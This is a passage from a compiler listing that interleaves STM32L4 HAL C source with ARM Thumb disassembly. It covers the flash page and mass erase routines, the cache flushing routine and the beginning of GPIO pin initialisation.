 80018ec:	4b34      	ldr	r3, [pc, #208]	; (80019c0 <HAL_FLASHEx_Erase+0x12c>)
 80018ee:	2203      	movs	r2, #3
 80018f0:	771a      	strb	r2, [r3, #28]
 80018f2:	e016      	b.n	8001922 <HAL_FLASHEx_Erase+0x8e>
      }
      else
      {
        pFlash.CacheToReactivate = FLASH_CACHE_ICACHE_ENABLED;
 80018f4:	4b32      	ldr	r3, [pc, #200]	; (80019c0 <HAL_FLASHEx_Erase+0x12c>)
 80018f6:	2201      	movs	r2, #1
 80018f8:	771a      	strb	r2, [r3, #28]
 80018fa:	e012      	b.n	8001922 <HAL_FLASHEx_Erase+0x8e>
      }
    }
    else if(READ_BIT(FLASH->ACR, FLASH_ACR_DCEN) != 0U)
 80018fc:	4b31      	ldr	r3, [pc, #196]	; (80019c4 <HAL_FLASHEx_Erase+0x130>)
 80018fe:	681b      	ldr	r3, [r3, #0]
 8001900:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8001904:	2b00      	cmp	r3, #0
 8001906:	d009      	beq.n	800191c <HAL_FLASHEx_Erase+0x88>
    {
      /* Disable data cache  */
      __HAL_FLASH_DATA_CACHE_DISABLE();
 8001908:	4b2e      	ldr	r3, [pc, #184]	; (80019c4 <HAL_FLASHEx_Erase+0x130>)
 800190a:	681b      	ldr	r3, [r3, #0]
 800190c:	4a2d      	ldr	r2, [pc, #180]	; (80019c4 <HAL_FLASHEx_Erase+0x130>)
 800190e:	f423 6380 	bic.w	r3, r3, #1024	; 0x400
 8001912:	6013      	str	r3, [r2, #0]
      pFlash.CacheToReactivate = FLASH_CACHE_DCACHE_ENABLED;
 8001914:	4b2a      	ldr	r3, [pc, #168]	; (80019c0 <HAL_FLASHEx_Erase+0x12c>)
 8001916:	2202      	movs	r2, #2
 8001918:	771a      	strb	r2, [r3, #28]
 800191a:	e002      	b.n	8001922 <HAL_FLASHEx_Erase+0x8e>
    }
    else
    {
      pFlash.CacheToReactivate = FLASH_CACHE_DISABLED;
 800191c:	4b28      	ldr	r3, [pc, #160]	; (80019c0 <HAL_FLASHEx_Erase+0x12c>)
 800191e:	2200      	movs	r2, #0
 8001920:	771a      	strb	r2, [r3, #28]
    }

    if (pEraseInit->TypeErase == FLASH_TYPEERASE_MASSERASE)
 8001922:	687b      	ldr	r3, [r7, #4]
 8001924:	681b      	ldr	r3, [r3, #0]
 8001926:	2b01      	cmp	r3, #1
 8001928:	d111      	bne.n	800194e <HAL_FLASHEx_Erase+0xba>
    {
      /* Mass erase to be done */
      FLASH_MassErase(pEraseInit->Banks);
 800192a:	687b      	ldr	r3, [r7, #4]
 800192c:	685b      	ldr	r3, [r3, #4]
 800192e:	4618      	mov	r0, r3
 8001930:	f000 f84a 	bl	80019c8 <FLASH_MassErase>

      /* Wait for last operation to be completed */
      status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 8001934:	f24c 3050 	movw	r0, #50000	; 0xc350
 8001938:	f7ff fef8 	bl	800172c <FLASH_WaitForLastOperation>
 800193c:	4603      	mov	r3, r0
 800193e:	73fb      	strb	r3, [r7, #15]
    defined (STM32L4R5xx) || defined (STM32L4R7xx) || defined (STM32L4R9xx) || defined (STM32L4S5xx) || defined (STM32L4S7xx) || defined (STM32L4S9xx)
      /* If the erase operation is completed, disable the MER1 and MER2 Bits */
      CLEAR_BIT(FLASH->CR, (FLASH_CR_MER1 | FLASH_CR_MER2));
#else
      /* If the erase operation is completed, disable the MER1 Bit */
      CLEAR_BIT(FLASH->CR, (FLASH_CR_MER1));
 8001940:	4b20      	ldr	r3, [pc, #128]	; (80019c4 <HAL_FLASHEx_Erase+0x130>)
 8001942:	695b      	ldr	r3, [r3, #20]
 8001944:	4a1f      	ldr	r2, [pc, #124]	; (80019c4 <HAL_FLASHEx_Erase+0x130>)
 8001946:	f023 0304 	bic.w	r3, r3, #4
 800194a:	6153      	str	r3, [r2, #20]
 800194c:	e02d      	b.n	80019aa <HAL_FLASHEx_Erase+0x116>
#endif
    }
    else
    {
      /*Initialization of PageError variable*/
      *PageError = 0xFFFFFFFFU;
 800194e:	683b      	ldr	r3, [r7, #0]
 8001950:	f04f 32ff 	mov.w	r2, #4294967295
 8001954:	601a      	str	r2, [r3, #0]

      for(page_index = pEraseInit->Page; page_index < (pEraseInit->Page + pEraseInit->NbPages); page_index++)
 8001956:	687b      	ldr	r3, [r7, #4]
 8001958:	689b      	ldr	r3, [r3, #8]
 800195a:	60bb      	str	r3, [r7, #8]
 800195c:	e01d      	b.n	800199a <HAL_FLASHEx_Erase+0x106>
      {
        FLASH_PageErase(page_index, pEraseInit->Banks);
 800195e:	687b      	ldr	r3, [r7, #4]
 8001960:	685b      	ldr	r3, [r3, #4]
 8001962:	4619      	mov	r1, r3
 8001964:	68b8      	ldr	r0, [r7, #8]
 8001966:	f000 f84d 	bl	8001a04 <FLASH_PageErase>

        /* Wait for last operation to be completed */
        status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 800196a:	f24c 3050 	movw	r0, #50000	; 0xc350
 800196e:	f7ff fedd 	bl	800172c <FLASH_WaitForLastOperation>
 8001972:	4603      	mov	r3, r0
 8001974:	73fb      	strb	r3, [r7, #15]

        /* If the erase operation is completed, disable the PER Bit */
        CLEAR_BIT(FLASH->CR, (FLASH_CR_PER | FLASH_CR_PNB));
 8001976:	4b13      	ldr	r3, [pc, #76]	; (80019c4 <HAL_FLASHEx_Erase+0x130>)
 8001978:	695b      	ldr	r3, [r3, #20]
 800197a:	4a12      	ldr	r2, [pc, #72]	; (80019c4 <HAL_FLASHEx_Erase+0x130>)
 800197c:	f423 737e 	bic.w	r3, r3, #1016	; 0x3f8
 8001980:	f023 0302 	bic.w	r3, r3, #2
 8001984:	6153      	str	r3, [r2, #20]

        if (status != HAL_OK)
 8001986:	7bfb      	ldrb	r3, [r7, #15]
 8001988:	2b00      	cmp	r3, #0
 800198a:	d003      	beq.n	8001994 <HAL_FLASHEx_Erase+0x100>
        {
          /* In case of error, stop erase procedure and return the faulty address */
          *PageError = page_index;
 800198c:	683b      	ldr	r3, [r7, #0]
 800198e:	68ba      	ldr	r2, [r7, #8]
 8001990:	601a      	str	r2, [r3, #0]
          break;
 8001992:	e00a      	b.n	80019aa <HAL_FLASHEx_Erase+0x116>
      for(page_index = pEraseInit->Page; page_index < (pEraseInit->Page + pEraseInit->NbPages); page_index++)
 8001994:	68bb      	ldr	r3, [r7, #8]
 8001996:	3301      	adds	r3, #1
 8001998:	60bb      	str	r3, [r7, #8]
 800199a:	687b      	ldr	r3, [r7, #4]
 800199c:	689a      	ldr	r2, [r3, #8]
 800199e:	687b      	ldr	r3, [r7, #4]
 80019a0:	68db      	ldr	r3, [r3, #12]
 80019a2:	4413      	add	r3, r2
 80019a4:	68ba      	ldr	r2, [r7, #8]
 80019a6:	429a      	cmp	r2, r3
 80019a8:	d3d9      	bcc.n	800195e <HAL_FLASHEx_Erase+0xca>
        }
      }
    }

    /* Flush the caches to be sure of the data consistency */
    FLASH_FlushCaches();
 80019aa:	f000 f84f 	bl	8001a4c <FLASH_FlushCaches>
  }

  /* Process Unlocked */
  __HAL_UNLOCK(&pFlash);
 80019ae:	4b04      	ldr	r3, [pc, #16]	; (80019c0 <HAL_FLASHEx_Erase+0x12c>)
 80019b0:	2200      	movs	r2, #0
 80019b2:	701a      	strb	r2, [r3, #0]

  return status;
 80019b4:	7bfb      	ldrb	r3, [r7, #15]
}
 80019b6:	4618      	mov	r0, r3
 80019b8:	3710      	adds	r7, #16
 80019ba:	46bd      	mov	sp, r7
 80019bc:	bd80      	pop	{r7, pc}
 80019be:	bf00      	nop
 80019c0:	2000000c 	.word	0x2000000c
 80019c4:	40022000 	.word	0x40022000

080019c8 <FLASH_MassErase>:
  *            @arg FLASH_BANK_2: Bank2 to be erased
  *            @arg FLASH_BANK_BOTH: Bank1 and Bank2 to be erased
  * @retval None
  */
static void FLASH_MassErase(uint32_t Banks)
{
 80019c8:	b480      	push	{r7}
 80019ca:	b083      	sub	sp, #12
 80019cc:	af00      	add	r7, sp, #0
 80019ce:	6078      	str	r0, [r7, #4]
  {
    /* Check the parameters */
    assert_param(IS_FLASH_BANK(Banks));

    /* Set the Mass Erase Bit for the bank 1 if requested */
    if((Banks & FLASH_BANK_1) != 0U)
 80019d0:	687b      	ldr	r3, [r7, #4]
 80019d2:	f003 0301 	and.w	r3, r3, #1
 80019d6:	2b00      	cmp	r3, #0
 80019d8:	d005      	beq.n	80019e6 <FLASH_MassErase+0x1e>
    {
      SET_BIT(FLASH->CR, FLASH_CR_MER1);
 80019da:	4b09      	ldr	r3, [pc, #36]	; (8001a00 <FLASH_MassErase+0x38>)
 80019dc:	695b      	ldr	r3, [r3, #20]
 80019de:	4a08      	ldr	r2, [pc, #32]	; (8001a00 <FLASH_MassErase+0x38>)
 80019e0:	f043 0304 	orr.w	r3, r3, #4
 80019e4:	6153      	str	r3, [r2, #20]
    SET_BIT(FLASH->CR, (FLASH_CR_MER1 | FLASH_CR_MER2));
  }
#endif

  /* Proceed to erase all sectors */
  SET_BIT(FLASH->CR, FLASH_CR_STRT);
 80019e6:	4b06      	ldr	r3, [pc, #24]	; (8001a00 <FLASH_MassErase+0x38>)
 80019e8:	695b      	ldr	r3, [r3, #20]
 80019ea:	4a05      	ldr	r2, [pc, #20]	; (8001a00 <FLASH_MassErase+0x38>)
 80019ec:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 80019f0:	6153      	str	r3, [r2, #20]
}
 80019f2:	bf00      	nop
 80019f4:	370c      	adds	r7, #12
 80019f6:	46bd      	mov	sp, r7
 80019f8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80019fc:	4770      	bx	lr
 80019fe:	bf00      	nop
 8001a00:	40022000 	.word	0x40022000

08001a04 <FLASH_PageErase>:
  *            @arg FLASH_BANK_1: Page in bank 1 to be erased
  *            @arg FLASH_BANK_2: Page in bank 2 to be erased
  * @retval None
  */
void FLASH_PageErase(uint32_t Page, uint32_t Banks)
{
 8001a04:	b480      	push	{r7}
 8001a06:	b083      	sub	sp, #12
 8001a08:	af00      	add	r7, sp, #0
 8001a0a:	6078      	str	r0, [r7, #4]
 8001a0c:	6039      	str	r1, [r7, #0]
  /* Prevent unused argument(s) compilation warning */
  UNUSED(Banks);
#endif

  /* Proceed to erase the page */
  MODIFY_REG(FLASH->CR, FLASH_CR_PNB, ((Page & 0xFFU) << FLASH_CR_PNB_Pos));
 8001a0e:	4b0e      	ldr	r3, [pc, #56]	; (8001a48 <FLASH_PageErase+0x44>)
 8001a10:	695b      	ldr	r3, [r3, #20]
 8001a12:	f423 727e 	bic.w	r2, r3, #1016	; 0x3f8
 8001a16:	687b      	ldr	r3, [r7, #4]
 8001a18:	00db      	lsls	r3, r3, #3
 8001a1a:	f403 63ff 	and.w	r3, r3, #2040	; 0x7f8
 8001a1e:	490a      	ldr	r1, [pc, #40]	; (8001a48 <FLASH_PageErase+0x44>)
 8001a20:	4313      	orrs	r3, r2
 8001a22:	614b      	str	r3, [r1, #20]
  SET_BIT(FLASH->CR, FLASH_CR_PER);
 8001a24:	4b08      	ldr	r3, [pc, #32]	; (8001a48 <FLASH_PageErase+0x44>)
 8001a26:	695b      	ldr	r3, [r3, #20]
 8001a28:	4a07      	ldr	r2, [pc, #28]	; (8001a48 <FLASH_PageErase+0x44>)
 8001a2a:	f043 0302 	orr.w	r3, r3, #2
 8001a2e:	6153      	str	r3, [r2, #20]
  SET_BIT(FLASH->CR, FLASH_CR_STRT);
 8001a30:	4b05      	ldr	r3, [pc, #20]	; (8001a48 <FLASH_PageErase+0x44>)
 8001a32:	695b      	ldr	r3, [r3, #20]
 8001a34:	4a04      	ldr	r2, [pc, #16]	; (8001a48 <FLASH_PageErase+0x44>)
 8001a36:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8001a3a:	6153      	str	r3, [r2, #20]
}
 8001a3c:	bf00      	nop
 8001a3e:	370c      	adds	r7, #12
 8001a40:	46bd      	mov	sp, r7
 8001a42:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001a46:	4770      	bx	lr
 8001a48:	40022000 	.word	0x40022000

08001a4c <FLASH_FlushCaches>:
/**
  * @brief  Flush the instruction and data caches.
  * @retval None
  */
void FLASH_FlushCaches(void)
{
 8001a4c:	b480      	push	{r7}
 8001a4e:	b083      	sub	sp, #12
 8001a50:	af00      	add	r7, sp, #0
  FLASH_CacheTypeDef cache = pFlash.CacheToReactivate;
 8001a52:	4b21      	ldr	r3, [pc, #132]	; (8001ad8 <FLASH_FlushCaches+0x8c>)
 8001a54:	7f1b      	ldrb	r3, [r3, #28]
 8001a56:	71fb      	strb	r3, [r7, #7]

  /* Flush instruction cache  */
  if((cache == FLASH_CACHE_ICACHE_ENABLED) ||
 8001a58:	79fb      	ldrb	r3, [r7, #7]
 8001a5a:	2b01      	cmp	r3, #1
 8001a5c:	d002      	beq.n	8001a64 <FLASH_FlushCaches+0x18>
 8001a5e:	79fb      	ldrb	r3, [r7, #7]
 8001a60:	2b03      	cmp	r3, #3
 8001a62:	d117      	bne.n	8001a94 <FLASH_FlushCaches+0x48>
     (cache == FLASH_CACHE_ICACHE_DCACHE_ENABLED))
  {
    /* Disable instruction cache */
    __HAL_FLASH_INSTRUCTION_CACHE_DISABLE();
 8001a64:	4b1d      	ldr	r3, [pc, #116]	; (8001adc <FLASH_FlushCaches+0x90>)
 8001a66:	681b      	ldr	r3, [r3, #0]
 8001a68:	4a1c      	ldr	r2, [pc, #112]	; (8001adc <FLASH_FlushCaches+0x90>)
 8001a6a:	f423 7300 	bic.w	r3, r3, #512	; 0x200
 8001a6e:	6013      	str	r3, [r2, #0]
    /* Reset instruction cache */
    __HAL_FLASH_INSTRUCTION_CACHE_RESET();
 8001a70:	4b1a      	ldr	r3, [pc, #104]	; (8001adc <FLASH_FlushCaches+0x90>)
 8001a72:	681b      	ldr	r3, [r3, #0]
 8001a74:	4a19      	ldr	r2, [pc, #100]	; (8001adc <FLASH_FlushCaches+0x90>)
 8001a76:	f443 6300 	orr.w	r3, r3, #2048	; 0x800
 8001a7a:	6013      	str	r3, [r2, #0]
 8001a7c:	4b17      	ldr	r3, [pc, #92]	; (8001adc <FLASH_FlushCaches+0x90>)
 8001a7e:	681b      	ldr	r3, [r3, #0]
 8001a80:	4a16      	ldr	r2, [pc, #88]	; (8001adc <FLASH_FlushCaches+0x90>)
 8001a82:	f423 6300 	bic.w	r3, r3, #2048	; 0x800
 8001a86:	6013      	str	r3, [r2, #0]
    /* Enable instruction cache */
    __HAL_FLASH_INSTRUCTION_CACHE_ENABLE();
 8001a88:	4b14      	ldr	r3, [pc, #80]	; (8001adc <FLASH_FlushCaches+0x90>)
 8001a8a:	681b      	ldr	r3, [r3, #0]
 8001a8c:	4a13      	ldr	r2, [pc, #76]	; (8001adc <FLASH_FlushCaches+0x90>)
 8001a8e:	f443 7300 	orr.w	r3, r3, #512	; 0x200
 8001a92:	6013      	str	r3, [r2, #0]
  }

  /* Flush data cache */
  if((cache == FLASH_CACHE_DCACHE_ENABLED) ||
 8001a94:	79fb      	ldrb	r3, [r7, #7]
 8001a96:	2b02      	cmp	r3, #2
 8001a98:	d002      	beq.n	8001aa0 <FLASH_FlushCaches+0x54>
 8001a9a:	79fb      	ldrb	r3, [r7, #7]
 8001a9c:	2b03      	cmp	r3, #3
 8001a9e:	d111      	bne.n	8001ac4 <FLASH_FlushCaches+0x78>
     (cache == FLASH_CACHE_ICACHE_DCACHE_ENABLED))
  {
    /* Reset data cache */
    __HAL_FLASH_DATA_CACHE_RESET();
 8001aa0:	4b0e      	ldr	r3, [pc, #56]	; (8001adc <FLASH_FlushCaches+0x90>)
 8001aa2:	681b      	ldr	r3, [r3, #0]
 8001aa4:	4a0d      	ldr	r2, [pc, #52]	; (8001adc <FLASH_FlushCaches+0x90>)
 8001aa6:	f443 5380 	orr.w	r3, r3, #4096	; 0x1000
 8001aaa:	6013      	str	r3, [r2, #0]
 8001aac:	4b0b      	ldr	r3, [pc, #44]	; (8001adc <FLASH_FlushCaches+0x90>)
 8001aae:	681b      	ldr	r3, [r3, #0]
 8001ab0:	4a0a      	ldr	r2, [pc, #40]	; (8001adc <FLASH_FlushCaches+0x90>)
 8001ab2:	f423 5380 	bic.w	r3, r3, #4096	; 0x1000
 8001ab6:	6013      	str	r3, [r2, #0]
    /* Enable data cache */
    __HAL_FLASH_DATA_CACHE_ENABLE();
 8001ab8:	4b08      	ldr	r3, [pc, #32]	; (8001adc <FLASH_FlushCaches+0x90>)
 8001aba:	681b      	ldr	r3, [r3, #0]
 8001abc:	4a07      	ldr	r2, [pc, #28]	; (8001adc <FLASH_FlushCaches+0x90>)
 8001abe:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 8001ac2:	6013      	str	r3, [r2, #0]
  }

  /* Reset internal variable */
  pFlash.CacheToReactivate = FLASH_CACHE_DISABLED;
 8001ac4:	4b04      	ldr	r3, [pc, #16]	; (8001ad8 <FLASH_FlushCaches+0x8c>)
 8001ac6:	2200      	movs	r2, #0
 8001ac8:	771a      	strb	r2, [r3, #28]
}
 8001aca:	bf00      	nop
 8001acc:	370c      	adds	r7, #12
 8001ace:	46bd      	mov	sp, r7
 8001ad0:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001ad4:	4770      	bx	lr
 8001ad6:	bf00      	nop
 8001ad8:	2000000c 	.word	0x2000000c
 8001adc:	40022000 	.word	0x40022000

08001ae0 <HAL_GPIO_Init>:
  * @param  GPIO_Init pointer to a GPIO_InitTypeDef structure that contains
  *         the configuration information for the specified GPIO peripheral.
  * @retval None
  */
void HAL_GPIO_Init(GPIO_TypeDef  *GPIOx, GPIO_InitTypeDef *GPIO_Init)
{
 8001ae0:	b480      	push	{r7}
 8001ae2:	b087      	sub	sp, #28
 8001ae4:	af00      	add	r7, sp, #0
 8001ae6:	6078      	str	r0, [r7, #4]
 8001ae8:	6039      	str	r1, [r7, #0]
  uint32_t position = 0x00u;
 8001aea:	2300      	movs	r3, #0
 8001aec:	617b      	str	r3, [r7, #20]
  assert_param(IS_GPIO_ALL_INSTANCE(GPIOx));
  assert_param(IS_GPIO_PIN(GPIO_Init->Pin));
  assert_param(IS_GPIO_MODE(GPIO_Init->Mode));

  /* Configure the port pins */
  while (((GPIO_Init->Pin) >> position) != 0x00u)
 8001aee:	e148      	b.n	8001d82 <HAL_GPIO_Init+0x2a2>
  {
    /* Get current io position */
    iocurrent = (GPIO_Init->Pin) & (1uL << position);
 8001af0:	683b      	ldr	r3, [r7, #0]
 8001af2:	681a      	ldr	r2, [r3, #0]
 8001af4:	2101      	movs	r1, #1
 8001af6:	697b      	ldr	r3, [r7, #20]
 8001af8:	fa01 f303 	lsl.w	r3, r1, r3
 8001afc:	4013      	ands	r3, r2
 8001afe:	60fb      	str	r3, [r7, #12]

    if (iocurrent != 0x00u)
 8001b00:	68fb      	ldr	r3, [r7, #12]
 8001b02:	2b00      	cmp	r3, #0
 8001b04:	f000 813a 	beq.w	8001d7c <HAL_GPIO_Init+0x29c>
    {
      /*--------------------- GPIO Mode Configuration ------------------------*/
      /* In case of Output or Alternate function mode selection */
      if (((GPIO_Init->Mode & GPIO_MODE) == MODE_OUTPUT) || ((GPIO_Init->Mode & GPIO_MODE) == MODE_AF))
 8001b08:	683b      	ldr	r3, [r7, #0]
 8001b0a:	685b      	ldr	r3, [r3, #4]
 8001b0c:	f003 0303 	and.w	r3, r3, #3
 8001b10:	2b01      	cmp	r3, #1
 8001b12:	d005      	beq.n	8001b20 <HAL_GPIO_Init+0x40>
 8001b14:	683b      	ldr	r3, [r7, #0]
 8001b16:	685b      	ldr	r3, [r3, #4]
 8001b18:	f003 0303 	and.w	r3, r3, #3
 8001b1c:	2b02      	cmp	r3, #2
 8001b1e:	d130      	bne.n	8001b82 <HAL_GPIO_Init+0xa2>
      {
        /* Check the Speed parameter */
        assert_param(IS_GPIO_SPEED(GPIO_Init->Speed));

        /* Configure the IO Speed */
        temp = GPIOx->OSPEEDR;
 8001b20:	687b      	ldr	r3, [r7, #4]
 8001b22:	689b      	ldr	r3, [r3, #8]
 8001b24:	613b      	str	r3, [r7, #16]
        temp &= ~(GPIO_OSPEEDR_OSPEED0 << (position * 2u));
 8001b26:	697b      	ldr	r3, [r7, #20]
 8001b28:	005b      	lsls	r3, r3, #1
 8001b2a:	2203      	movs	r2, #3
 8001b2c:	fa02 f303 	lsl.w	r3, r2, r3
 8001b30:	43db      	mvns	r3, r3
 8001b32:	693a      	ldr	r2, [r7, #16]
 8001b34:	4013      	ands	r3, r2
 8001b36:	613b      	str	r3, [r7, #16]
        temp |= (GPIO_Init->Speed << (position * 2u));
 8001b38:	683b      	ldr	r3, [r7, #0]
 8001b3a:	68da      	ldr	r2, [r3, #12]
 8001b3c:	697b      	ldr	r3, [r7, #20]
 8001b3e:	005b      	lsls	r3, r3, #1
 8001b40:	fa02 f303 	lsl.w	r3, r2, r3
 8001b44:	693a      	ldr	r2, [r7, #16]
 8001b46:	4313      	orrs	r3, r2
 8001b48:	613b      	str	r3, [r7, #16]
        GPIOx->OSPEEDR = temp;
 8001b4a:	687b      	ldr	r3, [r7, #4]
 8001b4c:	693a      	ldr	r2, [r7, #16]
 8001b4e:	609a      	str	r2, [r3, #8]

        /* Configure the IO Output Type */
        temp = GPIOx->OTYPER;
 8001b50:	687b      	ldr	r3, [r7, #4]
 8001b52:	685b      	ldr	r3, [r3, #4]
 8001b54:	613b      	str	r3, [r7, #16]
        temp &= ~(GPIO_OTYPER_OT0 << position) ;
 8001b56:	2201      	movs	r2, #1
 8001b58:	697b      	ldr	r3, [r7, #20]
 8001b5a:	fa02 f303 	lsl.w	r3, r2, r3
 8001b5e:	43db      	mvns	r3, r3
 8001b60:	693a      	ldr	r2, [r7, #16]
 8001b62:	4013      	ands	r3, r2
 8001b64:	613b      	str	r3, [r7, #16]
        temp |= (((GPIO_Init->Mode & OUTPUT_TYPE) >> OUTPUT_TYPE_Pos) << position);
 8001b66:	683b      	ldr	r3, [r7, #0]
 8001b68:	685b      	ldr	r3, [r3, #4]
 8001b6a:	091b      	lsrs	r3, r3, #4
 8001b6c:	f003 0201 	and.w	r2, r3, #1
 8001b70:	697b      	ldr	r3, [r7, #20]
 8001b72:	fa02 f303 	lsl.w	r3, r2, r3
 8001b76:	693a      	ldr	r2, [r7, #16]
 8001b78:	4313      	orrs	r3, r2
 8001b7a:	613b      	str	r3, [r7, #16]
        GPIOx->OTYPER = temp;
 8001b7c:	687b      	ldr	r3, [r7, #4]
 8001b7e:	693a      	ldr	r2, [r7, #16]
 8001b80:	605a      	str	r2, [r3, #4]
      }

#endif /* STM32L471xx || STM32L475xx || STM32L476xx || STM32L485xx || STM32L486xx */

      /* Activate the Pull-up or Pull down resistor for the current IO */
      if ((GPIO_Init->Mode & GPIO_MODE) != MODE_ANALOG)
 8001b82:	683b      	ldr	r3, [r7, #0]
 8001b84:	685b      	ldr	r3, [r3, #4]
 8001b86:	f003 0303 	and.w	r3, r3, #3
 8001b8a:	2b03      	cmp	r3, #3
 8001b8c:	d017      	beq.n	8001bbe <HAL_GPIO_Init+0xde>
      {
        /* Check the Pull parameter */
        assert_param(IS_GPIO_PULL(GPIO_Init->Pull));

        temp = GPIOx->PUPDR;
 8001b8e:	687b      	ldr	r3, [r7, #4]
 8001b90:	68db      	ldr	r3, [r3, #12]
 8001b92:	613b      	str	r3, [r7, #16]
        temp &= ~(GPIO_PUPDR_PUPD0 << (position * 2U));
 8001b94:	697b      	ldr	r3, [r7, #20]
 8001b96:	005b      	lsls	r3, r3, #1
 8001b98:	2203      	movs	r2, #3
 8001b9a:	fa02 f303 	lsl.w	r3, r2, r3
 8001b9e:	43db      	mvns	r3, r3
 8001ba0:	693a      	ldr	r2, [r7, #16]
 8001ba2:	4013      	ands	r3, r2
 8001ba4:	613b      	str	r3, [r7, #16]
        temp |= ((GPIO_Init->Pull) << (position * 2U));
 8001ba6:	683b      	ldr	r3, [r7, #0]
 8001ba8:	689a      	ldr	r2, [r3, #8]
 8001baa:	697b      	ldr	r3, [r7, #20]
 8001bac:	005b      	lsls	r3, r3, #1
 8001bae:	fa02 f303 	lsl.w	r3, r2, r3
 8001bb2:	693a      	ldr	r2, [r7, #16]
 8001bb4:	4313      	orrs	r3, r2
 8001bb6:	613b      	str	r3, [r7, #16]
        GPIOx->PUPDR = temp;
 8001bb8:	687b      	ldr	r3, [r7, #4]
 8001bba:	693a      	ldr	r2, [r7, #16]
 8001bbc:	60da      	str	r2, [r3, #12]
      }

      /* In case of Alternate function mode selection */
      if ((GPIO_Init->Mode & GPIO_MODE) == MODE_AF)
 8001bbe:	683b      	ldr	r3, [r7, #0]
 8001bc0:	685b      	ldr	r3, [r3, #4]
 8001bc2:	f003 0303 	and.w	r3, r3, #3
 8001bc6:	2b02      	cmp	r3, #2
 8001bc8:	d123      	bne.n	8001c12 <HAL_GPIO_Init+0x132>
        /* Check the Alternate function parameters */
        assert_param(IS_GPIO_AF_INSTANCE(GPIOx));
        assert_param(IS_GPIO_AF(GPIO_Init->Alternate));

        /* Configure Alternate function mapped with the current IO */
        temp = GPIOx->AFR[position >> 3u];
 8001bca:	697b      	ldr	r3, [r7, #20]
 8001bcc:	08da      	lsrs	r2, r3, #3
 8001bce:	687b      	ldr	r3, [r7, #4]
 8001bd0:	3208      	adds	r2, #8
 8001bd2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8001bd6:	613b      	str	r3, [r7, #16]
        temp &= ~(0xFu << ((position & 0x07u) * 4u));
 8001bd8:	697b      	ldr	r3, [r7, #20]
 8001bda:	f003 0307 	and.w	r3, r3, #7
 8001bde:	009b      	lsls	r3, r3, #2
 8001be0:	220f      	movs	r2, #15
 8001be2:	fa02 f303 	lsl.w	r3, r2, r3
 8001be6:	43db      	mvns	r3, r3
 8001be8:	693a      	ldr	r2, [r7, #16]
 8001bea:	4013      	ands	r3, r2
 8001bec:	613b      	str	r3, [r7, #16]
        temp |= ((GPIO_Init->Alternate) << ((position & 0x07u) * 4u));
 8001bee:	683b      	ldr	r3, [r7, #0]
 8001bf0:	691a      	ldr	r2, [r3, #16]
 8001bf2:	697b      	ldr	r3, [r7, #20]
 8001bf4:	f003 0307 	and.w	r3, r3, #7
 8001bf8:	009b      	lsls	r3, r3, #2
 8001bfa:	fa02 f303 	lsl.w	r3, r2, r3
 8001bfe:	693a      	ldr	r2, [r7, #16]
 8001c00:	4313      	orrs	r3, r2
 8001c02:	613b      	str	r3, [r7, #16]
        GPIOx->AFR[position >> 3u] = temp;
 8001c04:	697b      	ldr	r3, [r7, #20]
 8001c06:	08da      	lsrs	r2, r3, #3
 8001c08:	687b      	ldr	r3, [r7, #4]
 8001c0a:	3208      	adds	r2, #8
 8001c0c:	6939      	ldr	r1, [r7, #16]
 8001c0e:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
      }

      /* Configure IO Direction mode (Input, Output, Alternate or Analog) */
      temp = GPIOx->MODER;
 8001c12:	687b      	ldr	r3, [r7, #4]
 8001c14:	681b      	ldr	r3, [r3, #0]
 8001c16:	613b      	str	r3, [r7, #16]
      temp &= ~(GPIO_MODER_MODE0 << (position * 2u));
 8001c18:	697b      	ldr	r3, [r7, #20]
 8001c1a:	005b      	lsls	r3, r3, #1
 8001c1c:	2203      	movs	r2, #3
 8001c1e:	fa02 f303 	lsl.w	r3, r2, r3
 8001c22:	43db      	mvns	r3, r3
 8001c24:	693a      	ldr	r2, [r7, #16]
 8001c26:	4013      	ands	r3, r2
 8001c28:	613b      	str	r3, [r7, #16]
      temp |= ((GPIO_Init->Mode & GPIO_MODE) << (position * 2u));
 8001c2a:	683b      	ldr	r3, [r7, #0]
 8001c2c:	685b      	ldr	r3, [r3, #4]
 8001c2e:	f003 0203 	and.w	r2, r3, #3
 8001c32:	697b      	ldr	r3, [r7, #20]
 8001c34:	005b      	lsls	r3, r3, #1
 8001c36:	fa02 f303 	lsl.w	r3, r2, r3
 8001c3a:	693a      	ldr	r2, [r7, #16]
 8001c3c:	4313      	orrs	r3, r2
 8001c3e:	613b      	str	r3, [r7, #16]
      GPIOx->MODER = temp;
 8001c40:	687b      	ldr	r3, [r7, #4]
 8001c42:	693a      	ldr	r2, [r7, #16]
 8001c44:	601a      	str	r2, [r3, #0]

      /*--------------------- EXTI Mode Configuration ------------------------*/
      /* Configure the External Interrupt or event for the current IO */
      if ((GPIO_Init->Mode & EXTI_MODE) != 0x00u)
 8001c46:	683b      	ldr	r3, [r7, #0]
 8001c48:	685b      	ldr	r3, [r3, #4]
 8001c4a:	f403 3340 	and.w	r3, r3, #196608	; 0x30000
 8001c4e:	2b00      	cmp	r3, #0
 8001c50:	f000 8094 	beq.w	8001d7c <HAL_GPIO_Init+0x29c>
      {
        /* Enable SYSCFG Clock */
        __HAL_RCC_SYSCFG_CLK_ENABLE();
 8001c54:	4b52      	ldr	r3, [pc, #328]	; (8001da0 <HAL_GPIO_Init+0x2c0>)
 8001c56:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8001c58:	4a51      	ldr	r2, [pc, #324]	; (8001da0 <HAL_GPIO_Init+0x2c0>)
 8001c5a:	f043 0301 	orr.w	r3, r3, #1
 8001c5e:	6613      	str	r3, [r2, #96]	; 0x60
 8001c60:	4b4f      	ldr	r3, [pc, #316]	; (8001da0 <HAL_GPIO_Init+0x2c0>)
 8001c62:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8001c64:	f003 0301 	and.w	r3, r3, #1
 8001c68:	60bb      	str	r3, [r7, #8]
 8001c6a:	68bb      	ldr	r3, [r7, #8]

        temp = SYSCFG->EXTICR[position >> 2u];
